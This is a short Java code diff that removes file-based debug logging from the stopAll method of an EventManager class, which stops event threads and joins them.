@@ -18,7 +18,6 @@ import com.android.service.auto.Cfg;
 import com.android.service.file.AutoFile;
 import com.android.service.util.Check;
 
-// TODO: Auto-generated Javadoc
 /**
  * The Class EventManager.
  */
@@ -143,8 +142,6 @@ public class EventManager extends Manager<EventBase, Integer, Integer> {
 			Log.d("QZ", TAG + " (stopAll)");
 		}
 
-		AutoFile debug = new AutoFile("/mnt/sdcard", "debug.txt");
-
 		while (it.hasNext()) {
 			final Map.Entry<Integer, EventBase> pairs = it.next();
 			final EventBase event = pairs.getValue();
@@ -154,13 +151,10 @@ public class EventManager extends Manager<EventBase, Integer, Integer> {
 			}
 
 			try {
-				debug.append("    stop event: " + event + "\n");
-
+				
 				if (event.isRunning()) {
-					debug.append("    running event: " + event + "\n");
 					event.stopThread();
-					debug.append("    stopped event: " + event + "\n");
-
+					
 					try {
 						final Thread t = threads.get(event);
 						if (Cfg.DEBUG) {
@@ -168,13 +162,10 @@ public class EventManager extends Manager<EventBase, Integer, Integer> {
 						}
 
 						if (t != null) {
-							debug.append("    join event: " + event + "\n");
 							t.join();
-							debug.append("    delete event: " + event+ "\n");
 							threads.remove(event);
 						}else{
-							debug.append("    null thread\n");
-						}
+							}
 
 					} catch (final InterruptedException e) {
 						if (Cfg.DEBUG) {
@@ -188,7 +179,6 @@ public class EventManager extends Manager<EventBase, Integer, Integer> {
 					}
 				}
 			} catch (Exception ex) {
-				debug.write(ex.toString() + "\n");
 				if (Cfg.DEBUG) {
 					Log.d("QZ", TAG + " (stopAll): " + ex);
 				}
